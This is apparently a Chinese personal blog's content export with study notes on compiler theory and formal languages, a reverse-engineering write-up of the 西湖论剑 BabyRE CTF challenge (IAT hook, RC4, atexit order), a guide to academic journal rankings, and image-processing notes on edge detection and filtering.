<li>规约：最右规约和最左规约</li>
</ul>
<p>赋值语句的语法规则：</p>
<ul>
<li>A::&#x3D;V&#x3D;E</li>
<li>E::&#x3D;T|E+T</li>
<li>T::&#x3D;F|T*F</li>
<li>F::&#x3D;V|(E)|C</li>
<li>V::&#x3D;标识符</li>
<li>C::&#x3D;常数</li>
</ul>
<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>​		x &#x3D; a + b*50		根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母</p>
<p>A&#x3D;&gt;V&#x3D;E	&#x3D;&gt;	V&#x3D;E+T	&#x3D;&gt;	V&#x3D;E+T*F	&#x3D;&gt;	</p>
<p>T&#x3D;E+T*C	&#x3D;&gt;	</p>
<p>T&#x3D;E+T*50	&#x3D;&gt;</p>
<p>T&#x3D;E+F*50	&#x3D;&gt;</p>
<p>T&#x3D;E+V*50	&#x3D;&gt;</p>
<p>T&#x3D;E+b*50	&#x3D;&gt;</p>
<p>T&#x3D;T+b*50	&#x3D;&gt;</p>
<p>T&#x3D;V+b*50	&#x3D;&gt;</p>
<p>T&#x3D;a+b*50</p>
<p>如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算</p>
<p>计算机是用语法树来检验语法：</p>
<p><img src="/./../images/image-20230109181128958.png" alt="image-20230109181128958"></p>
<h3 id="中间代码生成"><a href="#中间代码生成" class="headerlink" title="中间代码生成"></a>中间代码生成</h3><ul>
<li>任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码</li>
<li>分为两阶段的工作：<ul>
<li>对每种语法范畴进行静态语义检查</li>
<li>如果语义正确，就进行中间代码的翻译</li>
</ul>
</li>
<li>中间代码形式：四元式、三元式、逆波兰式</li>
</ul>
<p>将x&#x3D;a+b*50变成中间代码：</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">算符</th>
<th align="center">左操作数</th>
<th align="center">右操作数</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">（1）</td>
<td align="center">将整常数50转换为实常数</td>
<td align="center"></td>
<td align="center"></td>
<td align="center">T<del>1</del></td>
</tr>
<tr>
<td align="center">（2）</td>
<td align="center">*</td>
<td align="center">b</td>
<td align="center">T<del>1</del></td>
<td align="center">T<del>2</del></td>
</tr>
<tr>
<td align="center">（3）</td>
<td align="center">+</td>
<td align="center">a</td>
<td align="center">T<del>2</del></td>
<td align="center">T<del>3</del></td>
</tr>
<tr>
<td align="center">（4）</td>
<td align="center">&#x3D;</td>
<td align="center">T<del>3</del></td>
<td align="center"></td>
<td align="center">x</td>
</tr>
</tbody></table>
<p>以上就是四元式</p>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul>
<li>对中间代码进行加工变换，变换出效率更高的代码</li>
<li>原则：等价变换，在不改变原意的情况下</li>
<li>主要方面：<ul>
<li>公共子表达式的提取：x&#x3D;<strong>(a+b)</strong>*c+<strong>(a+b)</strong>*d</li>
<li>合并已知量：c&#x3D;a+b   d &#x3D; a+b   未改变a，b的值</li>
<li>删除无用语句：一些注释或者一些与程序本身无关的表达式</li>
<li>循环优化</li>
</ul>
</li>
</ul>
<p>例如将以下语句转成中间代码：</p>
<pre><code class="c">for( k = 1; k &lt;= 100; k++)&#123;
    m = i + 10*k;
    n = j + 10*k;
&#125;
</code></pre>
<p><img src="/./../images/image-20230110193728210.png" alt="image-20230110193728210"></p>
<p>优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的</p>
<p><img src="/./../images/image-20230110193939323.png" alt="image-20230110193939323"></p>
<h3 id="目标代码生成"><a href="#目标代码生成" class="headerlink" title="目标代码生成"></a>目标代码生成</h3><ul>
<li>任务：把优化的中间代码转化成特定机器上的低级语言</li>
<li>目标指令的形式：<ul>
<li>绝对指令代码：就是01010的机器代码如exe文件，可立即执行</li>
<li>汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行</li>
<li>可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码</li>
</ul>
</li>
</ul>
<h3 id="表格与表格管理"><a href="#表格与表格管理" class="headerlink" title="表格与表格管理"></a>表格与表格管理</h3><ul>
<li>表格作用：用来记录源程序的各种信息以及编译过程中的各种状况</li>
<li>与编译前三阶段有关的表格：<ul>
<li>符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况<img src="/./../images/image-20230110195304443.png" alt="image-20230110195304443"></li>
<li>常数表与标号表：登记各类常数值，登记标号的定义与作用<img src="/./../images/image-20230110195424180.png" alt="image-20230110195424180"></li>
<li>入口名表：登记过程的层号，分程序符号表入口<img src="/./../images/image-20230110195523654.png" alt="image-20230110195523654"></li>
<li>中间代码表</li>
</ul>
</li>
</ul>
<h3 id="出错与处理"><a href="#出错与处理" class="headerlink" title="出错与处理"></a>出错与处理</h3><p>错误类型:</p>
<ul>
<li>语法错误:在词法分析和语法分析阶段检测出来</li>
<li>语义错误：一般在语义分析阶段检测</li>
</ul>
<p>遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。</p>
<p>（遍与阶段的含义毫无关系。）</p>
<p>一遍扫描</p>
<p><img src="/./../images/image-20230110195852519.png" alt="image-20230110195852519"></p>
<p>&#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D;</p>
<h3 id="编译程序生成"><a href="#编译程序生成" class="headerlink" title="编译程序生成"></a>编译程序生成</h3><p>生成方式：</p>
<ol>
<li>直接用机器语言编写编译程序</li>
<li>用汇编语言编写编译程序<ul>
<li>注：编译程序核心部分常用汇编语言编写</li>
</ul>
</li>
<li>用高级语言编写编译程序：这是普遍采用的方法</li>
<li>.自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序</li>
<li>编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表)</li>
<li>移植（同种语言的编译程序在不同类型的机器之 间移植）</li>
</ol>
<p>写编译程序的基本条件：</p>
<ul>
<li>源程序语言</li>
<li>目标程序语言</li>
<li>编译方法</li>
</ul>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>编译2</title>
    <url>/2023/01/12/%E7%BC%96%E8%AF%91%E7%AF%872/</url>
    <content><![CDATA[<p>高级语言描述</p>
<span id="more"></span>

<h3 id="编译基础知识"><a href="#编译基础知识" class="headerlink" title="编译基础知识"></a>编译基础知识</h3><ol>
<li>高级语言：程序语言是一个记号系统</li>
<li>语法<ul>
<li>语法使得这串字符形成一个形式上正确的程序。</li>
<li>语法＝词法规则＋语法规则</li>
<li>例如：<ul>
<li>0.5*x1+c *</li>
<li>0.5、x1、c、+是语言的单词符号 </li>
<li>0.5*x1+c是语言的语法单位</li>
</ul>
</li>
<li>语法单位：表达式、子句、语句、函数、过程、程序</li>
<li>语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。</li>
</ul>
</li>
<li>语义</li>
</ol>
<h3 id="字母表和符号表"><a href="#字母表和符号表" class="headerlink" title="字母表和符号表"></a>字母表和符号表</h3><p>一些概念：</p>
<ol>
<li><p>字母表：是符号的非空有穷集合，是符号的非空有穷集合</p>
</li>
<li><p>符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε</p>
</li>
<li><p>句子：字母表上符合某种规则构成的串。串就是句子</p>
<p>（注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合）</p>
</li>
</ol>
<p>符号串集合的运算：</p>
<p><img src="/./../images/image-20230112222858340.png" alt="image-20230112222858340"></p>
<p>符号串集合的运算：</p>
<p>例如：A&#x3D;{a,b}; B&#x3D;{c,e,d}</p>
<p>则AB&#x3D;{ac,ae,ad,bc,be,bd}</p>
<p>A中的元素必须在B元素的前面，否则是错的，这个顺序要搞对</p>
<p>例如：串集A＝{a}的各次方幂定义为：</p>
<p>– A0&#x3D;{ε} </p>
<p>– A1&#x3D;A&#x3D;{a}</p>
<p> – …… </p>
<p>– An&#x3D;AAn-1(n&gt;0)&#x3D;{a…a}</p>
<p>字母表的闭包与正闭包</p>
<ol>
<li>字母表A的闭包（A<em>）：A</em>&#x3D;A0∪A1∪A2∪… 即：由A上符号组成的所有串的集合（包括空串 ε ）</li>
<li>字母表A的正闭包（A+）：A+&#x3D; A1 ∪A2∪ …&#x3D;A*-{ε}   即：由A上符号组成的所有串的集合（不包括空 串ε ）</li>
<li>字母表上语言：是字母表上正闭包的子集</li>
</ol>
<h3 id="文法与语言的关系"><a href="#文法与语言的关系" class="headerlink" title="文法与语言的关系"></a>文法与语言的关系</h3><p>文法：</p>
<ul>
<li>其语法规则如下：<ul>
<li>– &lt;句子&gt;→&lt;主语&gt;&lt;谓语&gt; </li>
<li>– &lt;主语&gt; →&lt;形容词&gt;&lt;名词&gt;</li>
<li>– &lt;谓语&gt; →&lt;动词&gt;&lt;宾语&gt;</li>
<li>– &lt;宾语&gt; → &lt;形容词&gt;&lt;名词&gt;</li>
<li>– &lt;形容词&gt; →Young | pop</li>
<li>– &lt;名词&gt; →men | music </li>
<li>– &lt;动词&gt; →like</li>
</ul>
</li>
</ul>
<p>相关概念：</p>
<ol>
<li>非终结符<ul>
<li>出现在规则的左部、用&lt;&gt;括起来、表示一定 语法概念的词</li>
<li>非终结符集合用VN表示。</li>
</ul>
</li>
<li>终结符<ul>
<li>语言中不可再分割的字符串(包括单个字符 组成的串)。注：终结符是组成句子的基本单位</li>
<li>终结符集合用VT表示。</li>
</ul>
</li>
<li>开始符号</li>
</ol>
<p><img src="/./../images/image-20230114204912084.png" alt="image-20230114204912084"></p>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑wp</title>
    <url>/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/</url>
    <content><![CDATA[<p>西湖论剑wp</p>
<span id="more"></span>

<h2 id="BabyRE"><a href="#BabyRE" class="headerlink" title="BabyRE"></a>BabyRE</h2><p>给数组中的每一个函数都设置断点</p>
<p>开始动调，第一个函数，给输入的值进行检验是否是数字<img src="/./../images/image-20230215100917313.png" alt="image-20230215100917313"></p>
<p>第二个函数进行按位取反<img src="/./../images/image-20230215101120897.png" alt="image-20230215101120897"></p>
<p>取反后的结果<img src="/./../images/image-20230215101335001.png" alt="image-20230215101335001"></p>
<p>下个函数是IAT hook .替换GetLastError函数 替换为sub_4019D0函数<img src="/./../images/image-20230215101601229.png" alt="image-20230215101601229"></p>
<p>GetModuleHandle函数：获取一个应用程序或动态链接库的模块句柄 </p>
<p>GetModuleHandleA(0);返回0x00400000，而<em><strong>*模块句柄实际上就是模块在当前进程空间的装入地址。exe程序装入句柄一般为 0x00400000 。所以GetModuleHandle(NULL); 返回的值为 0x00400000；GetModuleHandle(“kernel32”)；返回值是0x7c800000(这个值正是kernel32.dll中的Image base的值)。*</strong></em></p>
<p>这里lpModuleName为kernel32<img src="/./../images/image-20230215111115149.png" alt="image-20230215111115149"></p>
<p>然后在kernel32模块中找GetLastError函数地址再将其替换这就是hook IAT的过程：先从程序句柄0x00400000中找kernel32.dll再从kernel32中找getlasterror。刚好两个循环</p>
<p>这里双击也可以查看<img src="/./../images/image-20230215111553991.png" alt="image-20230215111553991"></p>
<p><img src="/./../images/image-20230215111607580.png" alt="image-20230215111607580"></p>
<p>再给替换的函数加上断点<img src="/./../images/image-20230215101638875.png" alt="image-20230215101638875"></p>
<p>注意dword_4085C0是IAT之后的GetLastError函数</p>
<p>下一个函数是替换dword_408148的值<img src="/./../images/image-20230215101915168.png" alt="image-20230215101915168"></p>
<p>C 库函数 <strong>int atexit(void (*func)(void))</strong> 当程序正常终止时，调用指定的函数 <strong>func</strong>。您可以在任何地方注册你的终止函数，但它会在程序终止的时候被调用。<strong>func</strong> – 在程序终止时被调用的函数。</p>
<p>如果有多处atexit那么执行顺序是什么呢？</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

void functionA ()
&#123;
   printf(&quot;这是函数A\n&quot;);
&#125;

void functionB ()
&#123;
   printf(&quot;这是函数B\n&quot;);
&#125;

void functionC ()
&#123;
   printf(&quot;这是函数C\n&quot;);
&#125;

int main ()
&#123;
   /* 注册终止函数 */
   atexit(functionA );
   
   printf(&quot;启动主程序...\n&quot;);
   atexit(functionC );

   printf(&quot;退出主程序...\n&quot;);
   atexit(functionB );

   return(0);
&#125;
</code></pre>
<p><img src="/./../images/image-20230215105209445.png" alt="image-20230215105209445"></p>
<p>可以看出来多出atexit是以栈的执行顺序调用的</p>
<p>所以总结一下执行顺序</p>
<ol>
<li>sub_401170 输入检验 -&gt; </li>
<li>sub_401230 对某一内存数据进行按位取反</li>
<li>sub_4012B0 IAT hook 替换GetLastError函数 替换为sub_4019D0函数</li>
<li>main sub_4019D0 dword_408148, “dcbahgfelkjiponm”</li>
<li>sub_401670 base8 加密后memcmp(&amp;unk_4081D0, a16230465152334, 0x60u);</li>
<li>sub_4015C0 sub_401CC0加密后memcmp(Buffer, a67339fc92b4875, 0x28u);</li>
<li>sub_4014E0 执行RC4，后比较密文memcmp(&amp;unk_4084C0, &amp;unk_408090, 0x70u) )</li>
</ol>
<p>ebpf程序：eBPF 于 2015 年推出，是 <strong>Linux 的 一项 功能，可以直接在 Linux 内核中运行程序</strong>，而不是在无法直接访问内核资源的“用户空间”中运行程序。 eBPF 源于 BPF，本质上是处于内核中的一个高效与灵活的虚类虚拟机组件，以一种安全的方式在许多内核 Hook 点执行字节码。</p>
<p>资料链接：</p>
<ul>
<li><a href="https://blog.csdn.net/Rong_Toa/article/details/120250788">(61条消息) eBPF 入门之编程_rtoax的博客-CSDN博客_ebpf程序</a></li>
<li><a href="https://blog.csdn.net/melody157398/article/details/113409274">(61条消息) eBPF在android上的使用_布道师Peter的博客-CSDN博客</a></li>
</ul>
<p>VT是什么意思？</p>
<p>VT，全称是，Virtualization Technology，即是虚拟化技术，虚拟化技术可以扩大硬件的容量，简化软件的重新配置过程。<a href="https://product.pconline.com.cn/cpu/">CPU</a>的虚拟化技术可以单CPU模拟多CPU并行，允许一个平台同时运行多个操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。</p>
<p>VT实现：<a href="https://www.cnblogs.com/wingsummer/p/15971289.html">VT 入门番外篇——最小 VT 实现 - 寂静的羽夏 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>AI数学基础</title>
    <url>/2024/07/01/AI%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>AI</category>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>建议总结</title>
    <url>/2024/06/30/%E5%BB%BA%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="12d588fa56d83825f42ab614f8ff5cf4a9a8046727f54c8440aa1ba0ce732bc6"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>AI</category>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>期刊介绍</title>
    <url>/2024/06/29/%E6%9C%9F%E5%88%8A%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="如何查询期刊"><a href="#如何查询期刊" class="headerlink" title="如何查询期刊"></a>如何查询期刊</h1><h4 id="查询中文期刊用知网："><a href="#查询中文期刊用知网：" class="headerlink" title="查询中文期刊用知网："></a>查询中文期刊用知网：</h4><p>学校登录：<a href="https://fsso.cnki.net/">中国知网高校&#x2F;机构外部访问系统 (cnki.net)</a></p>
<p>期刊导航：<a href="https://navi.cnki.net/knavi/#">出版来源导航 (cnki.net)</a></p>
<img src="/./../images/image-20240629111920995.png" alt="image-20240629111920995" style="zoom:67%;">

<h4 id="查询sci（外文）："><a href="#查询sci（外文）：" class="headerlink" title="查询sci（外文）："></a>查询sci（外文）：</h4><p>地址1：<a href="https://www.letpub.com.cn/index.php?page=./journalapp">最新SCI期刊影响因子查询及投稿分析系统（2022-2023年）- LetPub</a></p>
<p>地址2：<a href="https://muchong.com/bbs/">小木虫论坛-学术科研互动平台 (muchong.com)</a>（一般不用）</p>
<img src="/./../images/image-20240630150210540.png" alt="image-20240630150210540" style="zoom:67%;">

<h4 id="查询计算机CCF评级的期刊会议"><a href="#查询计算机CCF评级的期刊会议" class="headerlink" title="查询计算机CCF评级的期刊会议"></a>查询计算机CCF评级的期刊会议</h4><p>地址：<a href="https://www.ccf.org.cn/Academic_Evaluation/By_category/">CCF推荐国际学术刊物目录-中国计算机学会</a></p>
<p><strong>A+会议就是传说中的顶会</strong></p>
<hr>
<h1 id="期刊分级"><a href="#期刊分级" class="headerlink" title="期刊分级"></a>期刊分级</h1><h2 id="按刊号所属地划分"><a href="#按刊号所属地划分" class="headerlink" title="按刊号所属地划分"></a>按刊号所属地划分</h2><p>CN:国内刊号</p>
<p>ISSN:国外刊号</p>
<p>《自动化学报》</p>
<img src="/./../images/image-20240630151256950.png" alt="image-20240630151256950" style="zoom:67%;">

<p>ISSN刊号很容易申请，所以一般具有CN的国内期刊都会申请一个ISSN刊号。</p>
<h2 id="按地域划分"><a href="#按地域划分" class="headerlink" title="按地域划分"></a>按地域划分</h2><p>划分为国家级和省级，一般没有明确规定，都是约定俗成</p>
<p>国家级指国家级单位主管主办，例如《基础教育》由中华人民共和国教育部主管主办</p>
<p>省级一般指各省、自治区等省级部门主管主办的刊物，例如《江西社会科学》，由江西省社会科学院主管主办</p>
<hr>
<h1 id="核心期刊"><a href="#核心期刊" class="headerlink" title="核心期刊"></a>核心期刊</h1><h2 id="国内核心"><a href="#国内核心" class="headerlink" title="国内核心"></a>国内核心</h2><p>核心来源一般由七大核心期刊，一般搜索期刊就会出现期刊属于哪个核心。<img src="/./../images/image-20240630185039990.png" alt="image-20240630185039990" style="zoom:67%;"></p>
<ul>
<li>北大核心（北大中文核心）   ————普及最广</li>
<li>南大核心（中文社会科学引文索引（CSSCI）来源期刊） ————最权威</li>
<li>科技核心（中国科技论文统计源期刊（CSTPCD））     ————知网不标注，医药机构的科核</li>
<li>CSCD（中国科学引文数据库） ————理科</li>
<li>人文社科核心（中国社会科学核心期刊（CHSSCD））</li>
</ul>
<blockquote>
<p>不同的学校对核心的认同不同。投论文时要注意</p>
</blockquote>
<p>想搞科研，往领域内最好的核心期刊投，sci</p>
<p>最好期刊：《自动化学报》《计算机学报》《研究发展》</p>
<p>不想读博，一般是某某大学学报</p>
<h2 id="国际核心"><a href="#国际核心" class="headerlink" title="国际核心"></a>国际核心</h2><ul>
<li>SCI(科学引文索引)<ol>
<li>理工科类</li>
<li>JCR划分（Q1、Q2、Q3、Q4，各25%）</li>
<li>按中科院划分（一区（5%）、二区（6-20%）、三区（21-50%）、四区（51-100%））</li>
</ol>
</li>
<li>SSCI（社会科学引文索引）    —————属于社会科学</li>
<li>A&amp;HCI（艺术人文引文索引）    ————艺术类</li>
<li>EI（工程索引）</li>
</ul>
<h2 id="ESCI、SCI和SCIE的区别"><a href="#ESCI、SCI和SCIE的区别" class="headerlink" title="ESCI、SCI和SCIE的区别"></a>ESCI、SCI和SCIE的区别</h2><p><strong>ESCI仅满⾜了SCI收录的第⼀级标准</strong>，如果满⾜了SCI的所有标准后可以被SCI收 录，⼤家可以理解ESCI期刊是通往SCI的预备阶段。 <strong>⼀般学校不承认ESCI期刊</strong></p>
<p>SCI-E是SCI的扩展版，⽬前SCI收录期刊3600多种，SCIE收录期刊6000多种， 被SCI收录的期刊应该都被SCI-E收，但反之却不成⽴。<strong>SCI是核⼼版，SCIE是⾮核⼼版</strong>，<strong>SCI⽐SCIE更重</strong>要；SCIE是⽹络版，SCI是纸质版。 <strong>⼀般学校都会承认SCIE</strong></p>
<h2 id="国际会议核心（ISTP、EI）"><a href="#国际会议核心（ISTP、EI）" class="headerlink" title="国际会议核心（ISTP、EI）"></a>国际会议核心（ISTP、EI）</h2><p>就是世界各地不定期举办的学术研讨会，针对某个会议主题面向世界征文，后面以此次会议名称为刊名，以会议论文集的形式出版，并递交EI-CA或ISTP数据库检索。</p>
<ul>
<li>CPCI&#x2F;ISTP（科技会议录索引）	————知名度不高</li>
<li>EI会议（理工科类会议索引）</li>
</ul>
<p>部分学校不认可会议，EI会议会被认为给钱就就行。</p>
<p>如果研究生认可，可以发这个保底毕业（一般来说给钱就中）</p>
<h2 id="普刊"><a href="#普刊" class="headerlink" title="普刊"></a>普刊</h2><p>不是核心就是普刊</p>
<p>机构买论文绝大多数是用钱打通审稿人的关系，这就是市场上核心难投，水刊难投的原因</p>
<h2 id="顶刊、权威、A、B、C、D类（学校内部期刊评级）"><a href="#顶刊、权威、A、B、C、D类（学校内部期刊评级）" class="headerlink" title="顶刊、权威、A、B、C、D类（学校内部期刊评级）"></a>顶刊、权威、A、B、C、D类（学校内部期刊评级）</h2><h3 id="什么是顶刊"><a href="#什么是顶刊" class="headerlink" title="什么是顶刊"></a>什么是顶刊</h3><p>一般指sci一区top，以letpub搜索的nature为例，会给出是否为top期刊</p>
<p>学校也有期刊的内部评级，一般找辅导员要就行</p>
<h3 id="计算机领域特有的期刊评级（CCF）"><a href="#计算机领域特有的期刊评级（CCF）" class="headerlink" title="计算机领域特有的期刊评级（CCF）"></a>计算机领域特有的期刊评级（CCF）</h3><h4 id="CCF和SCI区别"><a href="#CCF和SCI区别" class="headerlink" title="CCF和SCI区别"></a>CCF和SCI区别</h4><p>CCF是计算机领域的权威人士排的评级，而SCI分区是根据期刊影响因子来划分的。</p>
<p>SCI的范围更广，涉及学科更多，CCF更关注计算机领域。</p>
<h2 id="国际期刊"><a href="#国际期刊" class="headerlink" title="国际期刊"></a>国际期刊</h2><p>一般分为A、B、C三类</p>
<p>大都以SCI为准，部分学校以CCF为准</p>
<h2 id="国内期刊"><a href="#国内期刊" class="headerlink" title="国内期刊"></a>国内期刊</h2><p>分为T1、T2、T3类</p>
<p>一般就三大期刊，《自动化学报》《计算机学报》《计算机研究发展》和其他</p>
<h2 id="会议"><a href="#会议" class="headerlink" title="会议"></a>会议</h2><p>CCF会议一般分为A、B、C三个会议，注意很多学校不认可会议</p>
<h2 id="什么是顶会"><a href="#什么是顶会" class="headerlink" title="什么是顶会"></a>什么是顶会</h2><p>CCF-A或CORE排名中A+或大牛说的</p>
<h2 id="水刊"><a href="#水刊" class="headerlink" title="水刊"></a>水刊</h2><p>通过百度学术或谷歌学术中找出这两年在letpub或知网上的论文，然后进行期刊级别排名越差的越水</p>
<p>⼀般⼀篇的论⽂级别好坏，以⼆三区为界限，往上就很难直观的把它定义成⽔⽂，往下⼀般就会直观的把它定义成⽔⽂。因此，我挑⼀篇⼆区的论⽂来给⼤ 家引⼊，即往上很难出现⽐这还离谱的问题，往下出现的问题可能⽐这还离谱。</p>
<p>[置顶]期刊分级下载链接：<br><a href="https://imgmd.oss-cn-shanghai.aliyuncs.com/Bzhan-sou-UID383551518/all_qikan_fenji.pdf">https://imgmd.oss-cn-shanghai.aliyuncs.com/Bzhan-sou-UID383551518/all_qikan_fenji.pdf</a></p>
<p>计算机领域的，对CCF排名想要获取的，通过这个下载链接：<a href="https://imgmd.oss-cn-shanghai.aliyuncs.com/Bzhan-sou-UID383551518/CCF-qikan-paiming.zip">https://imgmd.oss-cn-shanghai.aliyuncs.com/Bzhan-sou-UID383551518/CCF-qikan-paiming.zip</a></p>
<p>备用百度网盘链接: <a href="https://pan.baidu.com/s/1ntzRhwT9fyHpn6sddy-dFA?pwd=8888">https://pan.baidu.com/s/1ntzRhwT9fyHpn6sddy-dFA?pwd=8888</a> 提取码: 8888<br>备用夸克网盘链接：<a href="https://pan.quark.cn/s/1d33da813715">https://pan.quark.cn/s/1d33da813715</a> </p>
]]></content>
      <categories>
        <category>AI</category>
        <category>论文</category>
      </categories>
      <tags>
        <tag>期刊</tag>
      </tags>
  </entry>
  <entry>
    <title>组会汇报1</title>
    <url>/2024/09/10/%E7%BB%84%E4%BC%9A%E6%B1%87%E6%8A%A51/</url>
    <content><![CDATA[<p>当前主流的模型聚焦与道路面的提取</p>
<p>TOPO是比较真实路网和计算路网上起点和终点的距离差异 </p>
<p>SP是比较起点和终点之间最短路径的相似度</p>
<p>Junction主要是衡量路口间的误差程度</p>
<p>IoU是一种测量在特定数据集中检测相应物体准确度的一个标准</p>
<p><strong>IoU是两个区域重叠的部分除以两个区域的集合部分得出的结果，通过设定的阈值，与这个IoU计算结果比较。</strong></p>
<p><img src="/./../images/image-20240911094856240.png" alt="image-20240911094856240"></p>
<p>HSV色彩空间：</p>
<p>基于色调、饱和度、亮度</p>
<p>色调H指光颜色，区间为[0,180]</p>
<p>饱和度S指色彩深浅，区间为[0,255],当饱和度为0时，图像变为灰色图像</p>
<p>亮度V指光的明暗，当饱和度相同时，亮度值越大，图像越亮，当亮度为0时，图像为纯黑色</p>
<p>灰度图像RGB三通道值相同就能得到</p>
<p>alpha通道为图像透明度通道</p>
<p>边缘特征提取方法</p>
<p>一阶微分算子：</p>
<p>利用图像灰度函数的梯度来检测边缘（利用梯度来检测图像中灰度值变化剧烈的区域，这些算子通过计算像素点在水平和垂直方向上的梯度值来检测边缘，当梯度值超过某个阈值时，认为该点是边缘点）；</p>
<p>二阶微分算子：</p>
<p>相比于一阶导数，二阶导数可以提供更多的边缘信息，例如边缘的方向和边缘的强度</p>
<h2 id="Canny边缘检测："><a href="#Canny边缘检测：" class="headerlink" title="Canny边缘检测："></a>Canny边缘检测：</h2><ol>
<li>利用高斯滤波器，来平滑图像，去除噪音 </li>
<li>计算图像中每个像素点的梯度强度和方向     sobel算子，c塔为方向<img src="/./../images/image-20240916220303019.png" alt="image-20240916220303019"></li>
<li>应用非极大值抑制，以消除边缘检测带来的杂散响应（保留大梯度，显示明显边缘）<img src="/./../images/image-20240916221819444.png" alt="image-20240916221819444"></li>
<li>应用双阈值检测潜在和真实的边缘     （过滤边界，只保留最真实的一部分）<img src="/./../images/image-20240916223528892.png" alt="image-20240916223528892"></li>
<li>通过抑制孤立的弱边缘最终完成检测</li>
</ol>
<p>边界存在梯度，所以梯度自然和边界垂直</p>
<p>利用<strong>多阶段滤波</strong>和梯度幅值来检测边缘，并使用<strong>非极大值抑制和双阈值检测</strong>来确定最终的边缘点；</p>
<p>非极大值抑制(NMS技术):去除检测出来的冗余框，保留最优框(对比每个框的重叠面积)</p>
<p>双阈值检测:</p>
<p>图像阈值化：根据图像内像素点强度的分布规律设置一个阈值，根据像素点强度是否低于&#x2F;高于阈值进行处理。用于突出边缘或纹理</p>
<p><strong>Ostu方法</strong>遍历所有可能的阈值，从中找到合适的阈值</p>
<p>二值化处理得到物体轮廓</p>
<p>原始图像-&gt;灰度图像-&gt;二值化图像-&gt;反二值化      物体边缘信息变得鲜明</p>
<p>感兴趣区域ROI（掩膜）: 从图像中选择一个图像区域，以便进一步处理img[R1：R2，L1:L2]</p>
<p>np.ones((101,101,3))创建一个101×101的三通道图像</p>
<p>图像融合是在图像加法基础上增加了权重不同的系数和亮度调节：cv.addWeighted(img1，weight1,img2.weight2,light)</p>
<p>查找目标模板在图象中处在什么位置叫模板匹配</p>
<p>cv2.matchTemplate的输出是[W-w+1,H-h+1]的32位浮点型数组</p>
<img src="/./../images/image-20240913210334144.png" alt="image-20240913210334144" style="zoom:80%;">

<p>单目标匹配只返回匹配度最高的结果</p>
<p>多目标匹配将原始图像中所有与模板相似的图像都找出来，使用相关匹配或相关系数匹配可以实现</p>
<p>在一张图片中同时查找多个模板叫多模板匹配？</p>
<p>平滑处理（图像模糊处理），去除图像内噪声、降低细节层次信息，工具 滤波器	</p>
<ul>
<li><p>均值滤波器、：滤波核内像素平均值</p>
<p><img src="/./../images/image-20240913220256194.png" alt="image-20240913220256194"></p>
</li>
<li><p>中值滤波器    将滤波核的像素大小排序然后取中间值</p>
</li>
<li><p>高斯滤波器（使用最广泛）   分配像素权重，远离核心权重小，靠近核心权重大</p>
</li>
<li><p>双边滤波器    平滑处理中有效保护图像边界信息，自动判断滤波核处于平坦还是边缘</p>
<ul>
<li>平坦     高斯滤波</li>
<li>边缘     加大权重，尽可能让像素保持不变</li>
</ul>
</li>
</ul>
<h3 id="腐蚀与膨胀"><a href="#腐蚀与膨胀" class="headerlink" title="腐蚀与膨胀"></a>腐蚀与膨胀</h3><p>为了清除和强化图像中的细节</p>
<ul>
<li>图像开运算</li>
<li>图像闭运算</li>
<li>梯度运算</li>
<li>顶帽运算</li>
<li>黑帽运算</li>
</ul>
<h4 id="腐蚀"><a href="#腐蚀" class="headerlink" title="腐蚀"></a>腐蚀</h4><p><img src="/./../images/image-20240913224058422.png" alt="image-20240913224058422"></p>
